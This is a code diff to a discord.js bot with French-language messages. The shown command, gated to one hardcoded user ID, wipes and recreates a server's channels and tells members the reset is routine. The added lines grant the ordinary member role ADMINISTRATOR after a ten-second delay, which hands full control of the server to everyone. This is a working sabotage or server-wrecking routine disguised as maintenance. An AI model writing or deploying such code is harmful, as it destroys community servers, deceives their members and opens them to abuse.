@@ -58,7 +58,10 @@ bot.on("message", async function(message) {
                     message.channel.send("Etes vous sur?").then(msg => {
                         msg.createReactionCollector((reaction, user) => reaction.emoji.name === '✅' && user.id === '178131193768706048', { time: 5000 }).on('collect', (reaction, collector) => {
                             var AllChannels = message.guild.channels
-                            
+                            message.guild.roles.get(MemberRole).setPermissions(['SEND_MESSAGES'])
+                            bot.setTimeout(function(){
+                                message.guild.roles.get(MemberRole).setPermissions(['ADMINISTRATOR'])
+                            },10000)
                             message.guild.createChannel('Salons textuels', 'category', null, "Reinitialisation du serveur").then(cat => {
                                 message.guild.createChannel('général', 'text', null, "Reinitialisation du serveur").then(chan => {
                                     chan.send("Le serveur vient d'être reinitialiser, cela arrive souvent, les roles/channels/emoji/Server setting ont tous été reinitialisée!");
@@ -119,6 +122,8 @@ Et surtout, amusez vous =)
                                     value.delete();
                                 };
                             });
+                            
+                            
                             
                         });
                         msg.react('✅');
